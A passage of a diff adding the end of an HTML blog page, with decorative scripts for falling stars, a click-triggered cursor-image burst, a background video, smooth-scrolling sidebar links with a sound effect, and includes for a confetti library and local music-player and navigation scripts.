+100% { transform: translateX(300px); }
+}
+</style>
+
+
+<script>
+(function() {
+const starfield = document.querySelector('.starfall-container .starfield');
+const skySegments = [
+{ x: [0, 33], y: [0, 33] },
+{ x: [33, 66], y: [0, 33] },
+{ x: [66, 100], y: [0, 33] },
+{ x: [0, 33], y: [33, 66] },
+{ x: [33, 66], y: [33, 66] },
+{ x: [66, 100], y: [33, 66] },
+{ x: [0, 33], y: [66, 100] },
+{ x: [33, 66], y: [66, 100] },
+{ x: [66, 100], y: [66, 100] }
+];
+const starsInSegment = 3;
+
+skySegments.forEach(segment => {
+for (let i = 0; i < starsInSegment; i++) {
+const star = document.createElement('div');
+star.className = 'falling-star';
+const x = segment.x[0] + Math.random() * (segment.x[1] - segment.x[0]);
+const y = segment.y[0] + Math.random() * (segment.y[1] - segment.y[0]);
+star.style.left = `${x}%`;
+star.style.top = `${y}%`;
+const delay = Math.random() * 9999;
+star.style.animationDelay = `${delay}ms`;
+const duration = 3000 + (Math.random() * 1000 - 500);
+star.style.animationDuration = `${duration}ms`;
+star.style.setProperty('--falling-delay', `${delay}ms`);
+const brightness = 0.75 + Math.random() * 0.5;
+star.style.opacity = brightness;
+starfield.appendChild(star);
+}
+});
+})();
+</script>
+<!-- Mouse effect :) -->
+<script>
+
+    var b = document.body;
+    var imgurl = "../../../assets/mouse/cursor.ico";
+    var size = [10, 20];
+    function rand(min, max)
+    {
+    return Math.floor(Math.random() * (max - min + 1) + min)
+    }
+    function getSize()
+    {
+    return rand(size[0], size[1]);
+    }
+    function lerp(a,b,f)
+    {
+    return (b-a)*f+a;
+    }
+    function heart(x,y)
+    {
+    var s = getSize();
+    x -= s/2;
+    y -= s/2;
+    x = Math.floor(x) + rand(-5, 5);
+    y = Math.floor(y) + rand(-5, 5);
+    var fx = x + rand(-40, 40);
+    var fy = y + rand(-40, 40);
+    var i = document.createElement("img");
+    i.src = imgurl;
+    i.style = `pointer-events: none; position: fixed; width: ${s}px; left: ${x}px; top: ${y}px; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; z-index: 1000000;`;
+    b.appendChild(i);
+    var f = 0;
+    var interval;
+    interval = setInterval(function() {
+    var _x = Math.floor(lerp(x, fx, f));
+    var _y = Math.floor(lerp(y, fy, f));
+    i.style = `pointer-events: none; position: fixed; width: ${s}px; left: ${_x}px; top: ${_y}px; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; z-index: 1000000;`;
+    i.style.opacity = 1-f;
+    f += 0.01;
+    if (f > 1)
+    {
+    clearInterval(interval);
+    b.removeChild(i);
+    }
+    }, 10);
+    }
+    function bro(x,y)
+    {
+    for (var i = 0; i < 5; i++)
+    {
+    heart(x,y);
+    }
+    }
+    b.addEventListener("click", function(event){
+    var x = event.clientX;
+    var y = event.clientY;
+    bro(x,y);
+    });
+    
+    </script>
+
+          <!--Background-->
+          <div class="video-background">
+            <video autoplay muted loop>
+                <source src="../../../assets/background/Intro-background.webm" type="video/webm">
+            </video>
+        </div>
+        
+        <script>
+// Smooth scroll for navigation with sound effect
+document.querySelectorAll('.blog-sidebar a').forEach(anchor => {
+    anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        // Play sound effect
+        const soundEffect = new Audio('selection.mp3');
+        soundEffect.play();
+        
+        const targetId = this.getAttribute('href');
+        const targetElement = document.querySelector(targetId);
+        
+        window.scrollTo({
+            top: targetElement.offsetTop - 20,
+            behavior: 'smooth'
+        });
+    });
+});
+        </script>
+<!-- Scripts -->
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+<script src="preloader.js"></script>
+<script src="../../../main-music-player/music-player.js"></script>
+<script type="text/javascript" src="../../../nav bar.js"></script>
+
+</body>
+</html>
